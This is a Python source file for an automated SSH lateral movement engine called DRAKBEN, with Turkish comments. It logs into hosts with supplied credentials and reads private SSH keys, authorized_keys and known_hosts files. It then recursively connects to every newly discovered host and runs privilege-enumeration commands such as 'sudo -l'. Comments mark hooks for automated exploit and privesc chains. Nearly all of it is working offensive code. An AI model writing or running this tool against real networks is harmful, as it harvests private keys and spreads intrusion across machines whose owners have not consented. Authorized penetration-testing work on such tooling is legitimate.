# core/lateral_movement_engine.py
# DRAKBEN Lateral Movement Engine - Automated SSH Chaining
# 2026

import os
import paramiko
from typing import List, Set, Dict

class LateralMovementEngine:
    """
    Automated SSH lateral movement and recursive exploitation engine.
    1. Finds SSH keys and hosts on target
    2. Recursively connects to each new machine
    3. Applies automated exploit/privesc
    """
    def __init__(self, initial_targets: List[str], username: str = "root", password: str = None, priv_key_path: str = None):
        self.initial_targets = initial_targets
        self.username = username
        self.password = password
        self.priv_key_path = priv_key_path
        self.visited_hosts: Set[str] = set()
        self.found_hosts: Set[str] = set(initial_targets)
        self.ssh_keys: Set[str] = set()
        self.known_hosts: Set[str] = set()
        self.authorized_keys: Set[str] = set()
        self.session_results: Dict[str, Dict] = {}

    def start(self):
        for target in self.initial_targets:
            self._recursive_ssh(target)

    def _recursive_ssh(self, host: str):
        if host in self.visited_hosts:
            return
        self.visited_hosts.add(host)
        print(f"[LATERAL] SSH bağlantısı: {host}")
        ssh = self._connect_ssh(host)
        if not ssh:
            print(f"[LATERAL] SSH bağlantı başarısız: {host}")
            return
        # SSH anahtarlarını ve hostları bul
        self._gather_ssh_artifacts(ssh, host)
        # Otomatik exploit/privesc uygula
        self._auto_exploit_and_privesc(ssh, host)
        # Yeni hostlara recursive bağlan
        for new_host in self.known_hosts - self.visited_hosts:
            self._recursive_ssh(new_host)
        ssh.close()

    def _connect_ssh(self, host: str):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if self.priv_key_path:
                key = paramiko.RSAKey.from_private_key_file(self.priv_key_path)
                ssh.connect(host, username=self.username, pkey=key, timeout=10)
            else:
                ssh.connect(host, username=self.username, password=self.password, timeout=10)
            return ssh
        except Exception as e:
            print(f"[LATERAL] SSH bağlantı hatası: {host} - {e}")
            return None

    def _gather_ssh_artifacts(self, ssh, host: str):
        # id_rsa, id_ecdsa, id_ed25519, authorized_keys, known_hosts dosyalarını bul
        files = ["~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519", "~/.ssh/authorized_keys", "~/.ssh/known_hosts"]
        for f in files:
            stdin, stdout, stderr = ssh.exec_command(f"cat {f} 2>/dev/null")
            content = stdout.read().decode()
            if content:
                if "id_" in f:
                    self.ssh_keys.add(content)
                elif "authorized_keys" in f:
                    for line in content.splitlines():
                        self.authorized_keys.add(line.strip())
                elif "known_hosts" in f:
                    for line in content.splitlines():
                        host_ip = line.split()[0].split(",")[0]
                        self.known_hosts.add(host_ip)
        print(f"[LATERAL] {host} -> Bulunan yeni hostlar: {self.known_hosts}")

    def _auto_exploit_and_privesc(self, ssh, host: str):
        # Burada mevcut exploit/privesc fonksiyonlarını çağırabilirsin
        print(f"[LATERAL] {host} -> Otomatik exploit/privesc başlatılıyor...")
        # Örnek: whoami, uname -a, sudo -l
        cmds = ["whoami", "uname -a", "sudo -l"]
        for cmd in cmds:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            output = stdout.read().decode()
            print(f"[LATERAL] {host} $ {cmd}\n{output}")
        # Burada drakben_v3.py içindeki exploit/privesc zincirini tetikleyebilirsin

# Kullanım örneği:
# engine = LateralMovementEngine(["192.168.1.100"], "kullanici", password="parola")
# engine.start()
